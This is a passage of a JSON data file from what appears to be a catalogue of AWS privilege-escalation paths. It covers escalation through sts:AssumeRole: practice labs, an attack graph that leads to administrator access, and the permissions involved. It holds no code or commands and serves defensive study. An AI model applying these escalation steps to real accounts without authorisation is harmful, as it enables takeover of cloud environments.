        "description": "Deploy Terraform into your own AWS account and practice individual exploitation paths"
      },
      "cloudgoat": {
        "type": "open-source",
        "githubLink": "https://github.com/RhinoSecurityLabs/cloudgoat",
        "scenario": "lambda_privesc",
        "description": "Deploy vulnerable infrastructure using CloudGoat to practice AWS attacks"
      },
      "cybr": {
        "type": "closed-source",
        "description": "Hosted learning environment with interactive AWS security labs",
        "scenario": "https://cybr.com/courses/iam-privilege-escalation-labs/",
        "scenarioPricingModel": "paid"
      },
      "pwnedlabs": {
        "type": "closed-source",
        "description": "Hosted cloud security labs with AWS privilege escalation scenarios",
        "scenario": "https://labs.pwnedlabs.io/demo-breach-in-the-cloud",
        "scenarioPricingModel": "paid"
      }
    },
    "attackVisualization": {
      "nodes": [
        {
          "id": "start",
          "label": "Starting Principal",
          "type": "principal",
          "description": "The principal initiating the attack. Can be an IAM user or role with sts:AssumeRole permission on the target role.\n"
        },
        {
          "id": "target_role",
          "label": "Existing Target Role",
          "type": "resource",
          "description": "The privileged role being assumed. Must have a trust policy that allows the starting principal to assume it.\n"
        },
        {
          "id": "admin",
          "label": "Effective Administrator",
          "type": "outcome",
          "description": "Full administrative access to the AWS account when the target role has AdministratorAccess or equivalent permissions.\n"
        },
        {
          "id": "no_access",
          "label": "No Additional Access",
          "type": "outcome",
          "color": "#cccccc",
          "description": "The assumed role has no interesting permissions beyond what the starting principal already had.\n"
        },
        {
          "id": "some_perms",
          "label": "Check for Additional Access",
          "type": "outcome",
          "color": "#ffeb99",
          "description": "The assumed role has some permissions. Check for data access (S3, RDS, DynamoDB) or additional privilege escalation paths.\n"
        }
      ],
      "edges": [
        {
          "from": "start",
          "to": "target_role",
          "label": "sts:AssumeRole",
          "description": "Use sts:AssumeRole to assume the target role. Requires both the permission and a matching trust policy on the role.\n"
        },
        {
          "from": "target_role",
          "to": "admin",
          "label": "If role has admin permissions",
          "branch": "A",
          "condition": "admin",
          "description": "If the target role has AdministratorAccess or equivalent permissions, the attacker gains full administrative access to the account.\n"
        },
        {
          "from": "target_role",
          "to": "no_access",
          "label": "If role has no interesting permissions",
          "branch": "B",
          "condition": "no_permissions",
          "description": "If the role only has minimal permissions (like logs:PutLogEvents), there may be no additional access gained.\n"
        },
        {
          "from": "target_role",
          "to": "some_perms",
          "label": "If role has some permissions",
          "branch": "C",
          "condition": "some_permissions",
          "description": "If the role has permissions to access data or enable other escalation paths, further exploration is needed.\n"
        }
      ]
    },
    "permissions": {
      "required": [
        {
          "permission": "sts:AssumeRole",
          "resourceConstraints": "Target role ARN must be in the Resource section and the role's trust policy must allow the principal to assume it"
        }
      ],
      "additional": [
        {
          "permission": "iam:ListRoles",
          "resourceConstraints": "Helpful for discovering available roles to assume"
        },
        {
          "permission": "iam:GetRole",
          "resourceConstraints": "Useful for viewing role trust policies and attached permissions"
        }
      ]
    },
    "gitMetadata": {
      "created": "2025-10-09T19:58:48Z",
      "lastUpdated": "2025-11-11T19:29:07Z",
      "contributors": [
        {
          "name": "Seth Art",
          "email": "seth.art@datadoghq.com",
          "githubUsername": "sethsec"
        }
      ]
    },
    "filePath": "data/paths/sts/sts-001.yaml"
  }
]